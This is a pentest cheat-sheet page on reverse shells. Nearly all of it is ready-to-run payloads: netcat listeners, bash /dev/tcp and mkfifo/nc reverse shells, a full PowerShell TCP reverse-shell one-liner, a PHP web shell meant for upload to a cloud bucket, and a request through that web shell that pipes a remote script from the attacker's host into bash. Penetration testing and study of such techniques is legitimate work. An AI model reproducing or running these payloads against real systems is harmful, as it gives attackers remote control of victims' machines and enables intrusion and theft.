---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shell

A reverse shell is a technique used to gain remote access to a victim's system by making the target machine initiate a connection back to the attacker. Unlike a traditional shell, this allows the target to "call back" to the attacker’s machine.&#x20;

Reverse shells are commonly used in penetration testing and hacking scenarios to maintain access, control compromised systems, and perform further exploitation.

Here we have some scripts that can be used to create a reverse shell for various scenarios:

## <mark style="color:orange;">Basic script</mark>

* Establish a listening port on the host machine with Netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nlvp $port     #An arbitrary port 
```
{% endcode %}

***

* Use a script to send the remote shell to the listening port

{% code title="RevShell.sh" overflow="wrap" lineNumbers="true" %}
```sh
#!/bin/bash

bash -i >& /dev/tcp/$ip/$port 0>&1
```
{% endcode %}

{% hint style="info" %}
* `$port`is the port listening with _netcat_ and `$ip` the host machine's IP
* If you are using a VPN `$ip` is the IP assigned by the VPN instead of the host IP
* Remember also to give execution permissions to the script
{% endhint %}

## <mark style="color:orange;">For Linux hosts</mark>

* Listen with Netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port
```
{% endcode %}

***

* Use a script to send the remote shell to the listening port

{% code title="RevShell-RM.sh" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f
```
{% endcode %}

{% hint style="info" %}
Remember also to give execution permissions to the script
{% endhint %}

## <mark style="color:orange;">For Powershell on Windows hosts</mark>

* Listen with Netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $port
```
{% endcode %}

***

* The command for getting the shell

{% code overflow="wrap" lineNumbers="true" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$IP',$port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}

## <mark style="color:orange;">For awscli</mark>

* Check if we have remote command execution

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php #Upload this file in the bucket
http://$url/shell.php?cmd=id #In browser. If there's a response, we have access
```
{% endcode %}

***

* Create a bash file for the reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash 
bash -i >& /dev/tcp/$myip/$portcat 0>&1 #Arbitrary port
```
{% endcode %}

***

* Listen with netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $portcat
```
{% endcode %}

***

* Create a server with python

{% code overflow="wrap" lineNumbers="true" %}
```bash
python3 -m http.server $port #Must be created at the same place where the reverse shell script is
```
{% endcode %}

***

* Use the `curl` command from the local server to get the reverse shell file and pass it to the bash of the machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
```
{% endcode %}
